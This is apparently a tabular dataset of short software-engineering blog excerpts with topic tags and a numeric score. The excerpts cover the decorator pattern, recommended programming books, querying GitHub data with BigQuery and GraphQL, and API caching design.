3641,"Suppose you have a repository interface that looks like this: I know that this is pretty anemic for data access but the focus of this post is the design pattern, so we are going to stick with a simple interface. Now, suppose you have two implementors of the interface. One that uses a structured database as a store, and the other uses an in memory store. For any one of these methods you could have quite a bit going on. You want to store the data of course, but then you probably also want to do all kinds of logging, validation, and possibly even authorization. For the SQL implementor, lets use Entity Framework, for simplicity.","['Software Design Patterns', 'Software Development', 'Design Patterns', 'Software Architecture', 'Software Engineering']",8
3642,"Do this for each of the methods and you have a decorator! The reason why this so powerful is that now we have logging abstracted away from the implementation of the specific repository. Whether we use the EFRepository, or the In Memory Repository, we can provide logging by wrapping it in the logging decorator. This also gives us the ability to easily turn logging on or off, simply by using the decorator. Using the Builder Pattern to create and combine the decorators can be a good way to manage the added complexity of combining and ordering decorators. Consider being able to construct your repository like this: Some final notes on decorators: The order is important! Notice that our logging decorator is listed last. This is because it catches exceptions and logs them. If you want an exception that is thrown by the validator to be logged by the logging decorator then the logging decorator needs to wrap the validator decorator. Also consider that a decorator has to accept anything that it needs to perform its task to be constructor injected.","['Software Design Patterns', 'Software Development', 'Design Patterns', 'Software Architecture', 'Software Engineering']",15
3643,"Robert Glass Facts and Fallacies of Software Engineering is a collection of cases for the common workbench. Each insight provides a description, a characterization of any controversies, and sources to consult. These elements introduce many software engineering topics. These areas are essential to a basic toolbox. The standard set of tools is expanded by Glass facts. His book Facts and Fallacies of Software Engineering is necessary reading for any developer.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",12
3644,"Frederick Brooks The Mythical Man-Month adds foundational insight to the baseline toolkit. This wisdom takes the form of maxims more than numbers. Brooks data may not be correct, although his intuition is. Brooks instinct leads him to assert that software written for others requires more effort than programs written for the developer. His hunch matches the experience of most programmers. A software engineer might quibble with Brooks cited magnitude difference, but he still concedes that the gap is nontrivial. The point about that disparity, and others, are the insights that The Mythical Man-Month adds to the basic development tool belt.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",12
3645,"Thomas Sowells Knowledge and Decisions expands the standard bag of tricks with a sketch of human knowledge and decision-making. The know-how required to make decisions is dispersed. The proficiency to make every choice is not held by one person, or even a few people. Many individuals are required for effective decision-making to occur, a point that Sowell drives home through many chapters. His book Knowledge and Decisions provides an essential portrait of human intuition and judgement.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",4
3646,"Matt Ridleys The Rational Optimist augments the basic toolkit with a picture of interpersonal exchanges of knowledge. A transaction of expertise leaves each person involved with a surplus of skills. In fact, new abilities can be devised, when knowledge is combined. Some of that expertise might not have been available to the inventor, if human beings had not engaged in an exchange of their respective insights. Understanding these transactions is a useful tool for developers. Programmers can add this technique to their toolboxes by reading The Rational Optimist.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",12
3647,"Gerald Weinbergs The Psychology of Computer Programming widens the standard workbench with an image of the headspace of programmers, their environment, and their tasks. For example, software engineers may be motivated by the challenge of a job instead of money. The task itself has some unexpectedly difficult elements such as specifications. Aspects of programming and programmers can be counterintuitive. Yet, parts of the engineering environment such as managerial hierarchies are more conventionally challenging. The world of software development has its own portrait. That picture is a useful one to have in the tool belt. To add that sketch to the workbench, read The Psychology of Computer Programming.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",12
3648,"Gerald Weinbergs An Introduction to General Systems Thinking amplifies the existing toolkit with general approaches to puzzles. These methods stem from the general systems philosophy. This doctrine looks for the underlying similarities across a multitude of disciplines. These cross-specialty parallels supply a number of useful attacks. For example, abstraction and decomposition provide assaults on the complexity inherent to subjects such as physics. The topic of computer programming could certainly benefit from the techniques of the general systems philosophy. To add these methods to the arsenal, read An Introduction to General Systems Thinking.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",5
3649,"Henry Hazlitts Economics in One Lesson enhances a developers workbench with the basic concepts of economics. The dismal science is an area of study permeated by equations, graphs, and charts. These elements are not prominent in Hazlitts book. He prefers to explain economics through concepts rather than numbers. The primary idea is the seen and the unseen. The observed are the first order costs and/or benefits. The unobserved are the higher order outlays and/or gains. The detected effects are the direct outcomes, while the undetected consequences are the second, third, and fourth order results. These events and their perception are discussed the books various chapters. Hazlitts Economics in One Lesson adds the concepts of economics to a programmers arsenal.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",5
3650,"Keith Stanovichs How to Think Straight About Psychology extends the developers toolkit with various scientific techniques. Science is not in the title of Stanovichs book. Yet, his book is actually a primer on scientific tools. The author applies them to psychology, but he could have easily applied them to any other field. Software development could just as easily use a primer on methods such as random sampling, blinding, experimental controls, etc. To understand these approaches in detail, read How to Think Straight About Psychology.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",5
3651,"John Allen Paulos Innumeracy gives programmers basic statistical tools. Yet, skills with numbers are not simply what Paulos book attempts to provide. Innumeracy tries to give its reader the ability to reason mathematically, an ability that human psychology can make difficult. The capability to think about numbers clearly is hampered by human intuition, a phenomenon that Paulos explains. Innumeracy demonstrates how a persons instincts and statistics might reveal different answers. This difference in results is what Paulos tries to drive home. He wants to provide his readers with the tools guard against the errors of their own intuition. The gut feelings of programmers are no better than the instincts of non-programmers. Software engineers need the skills that Innumeracy provides as much as anyone else does.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",5
3652,"Barry Boehm, Jo Ann Lane, Supannika Koolmanojwong, and Richard Turners The Incremental Commitment Spiral Model presents developers with procedural approaches. These methods include a process and several principles. The system is less applicable than the principles are. The rules can be used to augment an existing strategy, while the scheme requires implementing one from scratch, a difficult task. The job of expanding a programmers process with certain ideas is an easier undertaking than implementing a procedure is. To update a system with those principles, read The Incremental Commitment Spiral Model.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",12
3653,"John Lakos Large-Scale C++ Software Design bolsters the existing toolbox with methods for building sizable software. Big products require techniques different from small commodities. Massive systems require special attention to testing and organization. Shortfalls in those areas generate costs that are significant in substantial software but are insignificant in minuscule programs. Sizable products require techniques to avoid expenditures due to deficiencies in verification and design. These outlays are bypassed by the methods provided in Lakos book. One recommended approach is an architecture with an acyclic dependency-graph whose elements are labeled according to a level-system. A layering-scheme and an acyclic diagram allow independent and orderly testing, reducing the cost of verification and validation. These techniques for reducing that cost, and other problems associated with large software, are provided by Large-Scale C++ Software Design.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",9
3654,"Steve Krugs Dont Make Me Think widens the current tool belt with skills for designing a less painful user experience. A persons engagement with software can be fraught with difficulty. One common hindrance is determining a means of achieving ones goal. These mechanisms should not require much thought, but they frequently do. Thinking makes a user experience painful. Reducing unnecessary reflection eases that discomfort. Tools for diminishing displeasure are what Krugs Dont Make Me Think provides. These approaches can broaden the workbench of any programmer.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",12
3655,"Robert Martins Agile Software Development, Principles, Patterns, and Practices enlarges the current armory with abilities targeted towards object-oriented design. These skills are described by the acronym: SOLID. The phrase is a rubric for several principles of object-oriented design. These doctrines attempt to make object-based software flexible and maintainable. Malleable and sustainable products are a common goal. To that end, Agile Software Development, Principles, Patterns, and Practices should enhance the toolkit of many software developers.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",12
3656,"Adam Shostacks Threat Modeling bolsters the current array with a system for approaching software security. This scheme is called a threat modeling. It endeavors to construct a threat a model. That blueprint is used to enumerate security-related dangers. Each risk is mitigated, accepted, or transferred. Each means of mitigation, acceptance, or transference is tested. Threat modeling provides a systematic approach to security. To learn more about that method, read Shostacks Threat Modeling.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",5
3657,"Robert Martins Clean Code provides a set of practices for writing hygienic methods and classes. Martins procedures help to wash away some of codes dirt and grime. Filth has a way of creeping into software. Some classes gain too many entanglements. These pieces of code accumulate muck over time. To wash that gunk away or to prevent it from piling up, follow the routines in Clean Code.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",9
3658,"Many attacks are required to handle the complicated problems of developing software well. Software engineering requires a large, eclectic arsenal. The days and minutes necessary to read every book in every section listed here are large. Learning every tome takes many more months and years. Reserve a few hours and minutes every day to learn a chunk of the areas described here. These categories are not meant to be mastered in a year let alone a month, day, or hour.","['Programming', 'Software Development', 'Software Engineering', 'Book Recommendations']",2
3659,"The primary purpose of the OOPs concept is to perform real-world things.1. Encapsulation Object: An object is a real-world entity like a pen, table, chair, car, etc. Objects are the mixture of attributes and methods. Attributes define the behavior of the object. The object is run time entity. To understand this better, lets take an example of Dog.","['Programming', 'Java', 'Java Oops Concept', 'Oops In Java', 'Object Oriented Program']",9
3660,"It started with an innocent question: Is it worth using project boards in the go-ethereum repository? What labels shall we use for our issues? How many issues is it OK to have? Show me a non-trivial project with less than 100 issues.) How shall we share our roadmapuse milestones or a different tag for each planned release? Surprisingly few articles address these questions and most are based on opinions and personal preferences. Github has a detailed explanation of project boards without giving a pointer to any real-world example. If you click some random trending repositories, youll probably not find any that uses projects in a meaningful way. We need a more systematic approach.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",19
3661,"Its creator, Ilya did the heavy-lifting for us. He wrote a script to fetch every json from the Github timeline, parses and uploads them to a public dataset on Google Big Query. You can find the events neatly packed into daily, monthly, and yearly tables. You can query them using Googles variant of SQL. To get all events related to projects or milestones, I simply typed It returned zero results. The documentation on Milestone Event gives a warning this type of event is not visible on timelines. The central concept of Github is a repository which is not surprising given its name and the initial idea of having a hub of git repositories. You can query repositories by many attributes, creation date, number of stars and forks. But projects seem to be second-class citizens in this ecosystem. While hello NOT world stars:>=1000 created:2014-10-10. * is a valid query to show repositories containing hello, but not world with at least a thousand stars created after Malala Yousafzai received the Nobel Peace Prize, this is not working: projects:>10. Nor can you star or label a project.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",6
3662,"What does a top repository mean? Is it the most popular one? The one with most users or most contributors? It may be the number of downloads that matters most. But it would be unfair with repos that are not applications in a traditional sense, but a collection of configurations.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",18
3663,"Whatever repositories youre looking for, you can sort the results by the number of stars or by the number of forks. Sorting by stars shows how popular a repo is. Clicking the star button takes a single impulsive second. People do it all the time as the frequency of events on Git Live shows. There are some venerable projects in this list, tensorflow, react-native, and vscode made it to the first 20. How a roadmap to becoming a web developer in 2018 received more than 60 thousand stars is beyond my understanding. It would be an interesting software-sociological study how Java Script frameworks compete. While __url__ is great at collecting stars, __url__ has 8 times as many contributors. But Im not interested in the winners of a popularity contest, I want something more fundamental.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",19
3664,"Forking a project takes more technical expertise. Well, it takes only a click, too, but a layman has no clue what it means. You need a basic understanding of git to fork a repo. The list of most forked repos is an interesting mix. Some are used for educational purposed. I didnt understand first why a cookbook got forked so many times. Especially that it contains only three recipes. Its used by an online git course. A repository is also a good way to give an assignment to your students: you publish the skeleton, they have to make a copy of their own, and finish the assignment. Bootstrap, tensorflow, and angular have a good ranking here as well. Just by looking at this list, its hard to decide automatically why a repository is forked frequently.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",18
3665,"The third option Github offers is to explore the site. You can have a look at trending repos, but the widest timeframe you can select is monthly. It sports some stunning repos, like MS-DOS (is it really trending in 2018, guys, or did Microsoft buy Github?) and algorithm interview notes in Chinese which I dont expect to be a long-lived success. Popular topics change every time you refresh it. It takes into account your interest and gives interesting results to anonymous users, too. But after the second refresh, it presented Perl 6 to me. (Not that I dont like Perl, it actually used to be my favorite language, but it happened in another century. )Googling for the top projects on Github results in a lot of articles. They are often based on one of the above metrics. Some just share a list like Git Hubs top 10 rock-star projects that looks OK first, it contains great and well-known projects. However, I couldnt find any reference why these 10 projects had the honor of being called rock stars. Git Most Wanted uses its own algorithm to pick the most interesting projects based on their maturity, status, and worth.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",19
3666,"A good starting point is to look at blockchain and cryptocurrency topics on Github. I simply googled for the top companies, visited their site, and tried to find their Github organization. Some have a more active presence with a direct link to it, in some other cases, I had to do manual work. For some blockchain companies I couldnt find any github organization. The final query is almost identical to the one above, I just added a condition to the where-clause Executing the query gives this result: The only repos in this list that made it to the list of the top 100 are EOSIO/eos and ethereum/go-ethereum.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",7
3667,"How many projects does a repository have? Its a no-brainer, use the REST endpoint for projects. You need to handle pagination if you want to get the exact number. But first, we just want to know if a repository has at least a couple of projects. A couple is a vague term, we can specify it later. One is not enough, because the owner might have been playing with this feature. She created a single project and never used it beyond the initial testing. So lets find out which repos have at least 2 projects. We dont even have to worry about pagination, the first result set is enough to get this information.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",18
3668,"Pagination is not the biggest problem here. We want to collect all sorts of information for a repo. How many milestones does it have? How many of them are open? How many issues does it have, both open, and closed? How many labels, releases, pull requests, and watchers? How many, how many, how many? To get more than ten attributes for each of the top hundred repos well need more than a thousand queries. I dont think Git Hub likes it.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",18
3669,"Graph QL was created to address these woes. You write a single query and tell it what information you need about some objects (repositories in this case), and you get back a json with exactly the data you requested. You fire up the Git Hub Graph QL API Explorer, executeand get back The editor sports code completion and a context-sensitive help. I kept adding more and more fields to the query as the editor offered them since they looked meaningful. I ended up with a graphql query of 15 attributes.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",8
3670,"But Graph QL is not a graph database by itself, its only an API. What you can and cannot query is limited. I originally wanted to find repos that use projects extensively. In a database I would query for repos and the number of their projects, then filter out those with a total Count > 1. The only way to search for specific repos is using a single search string. It has the same search syntax as the one used in the search box on the github site. Ill run my query, put the result into a spreadsheet, and filter manually what I need.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",8
3671,"How do I run a query for the 100 repos I collected earlier? Weve seen an example how to run it for one. It must be easy for more: Unfortunately, it has two problems. It looks ugly and hard to maintain if I add all the 15 fields after the project count. On top of that, Graph QL doesnt allow two fields with the same name but with different arguments. Fragments can solve the first problem and aliases the second. This is a working version of the previous example.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",18
3672,"I can finally run a single query instead of 1500. I executed my big query and it returned an empty string. It must be some resource limitation, but the query doesnt reach the documented 5000 nodes. I kept halving the lines to determine empirically how many repos I can query. The result was inconsistent, but I couldnt get all the fields I wanted for more than 3 repos in one run.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",8
3673,"I said goodbye to the editor and started to look for a Graph QL client. The idea is I iterate over the repos and get all the fields for each in one run. Clients abound, theres an awesome list of Graph QL clients and libraries for many languages. First I tried to figure out how to send a query to Git Hub with the right access tokens. Then I thought someone else must have figured it out before me. And yes, Node-Github-Graph QL came to the rescue.","['Github', 'Google Big Query', 'GraphQL', 'Project Management', 'Open Source']",18
3674,"One of the biggest issues is that in order to satisfy all clients calling an endpoint, we must serve a lot of data. Lets say we have two client applications, a web client and a mobile app client, consuming the GET /articles endpoint. The web client only needs to know about an articles title, topic, and description. Meanwhile, the mobile app client wants the articles title and author. In order to support both of these requirements, our payload for each individual article needs to look something like this: Both clients now have the data they need, as well as some extra data that they will simply ignore. While this example payload is pretty small, a typical VICE article object can be as small as 6 or 7KB and as large as 100KB+. The __url__ homepage has 18 articles displayed on it at the time of this writing, which means that we can end up serving over 1MB of data just so the web application can display a collection of links and thumbnail images (note: the 1MB payload does not include the additional image files, fonts, etc. that need to be downloaded by the client).","['GraphQL', 'Nodejs', 'API', 'Backend', 'Microservices']",19
3675,"Within the confines of a single service, the database tends to be the largest performance bottleneck. In order to combat this, we keep a Redis cache for recently run database queries. While its possible to allow clients to structure their own database calls to only return necessary fields, wed run into the issue of having to create multiple results caches for items in their various queried formats. This method would also mean that more cached content would have to be invalidated when an article is updated. This would lead to a far greater strain on our database, given that every client application would need differently structured data. Were able to avoid these caching issues by not allowing clients to define their desired database fields.","['GraphQL', 'Nodejs', 'API', 'Backend', 'Microservices']",8
3676,"It will open up the gates to the abstraction hell and it will suck you in. You need to sit down with the domain experts and start getting to know what you are supposed to be modelling in your code. You need to spend some time decomposing the actuall business, domain rules and define the use cases that will drive the development. If there already is use cases defined. And try to understand where they are coming from before you start writing code.",[''],19
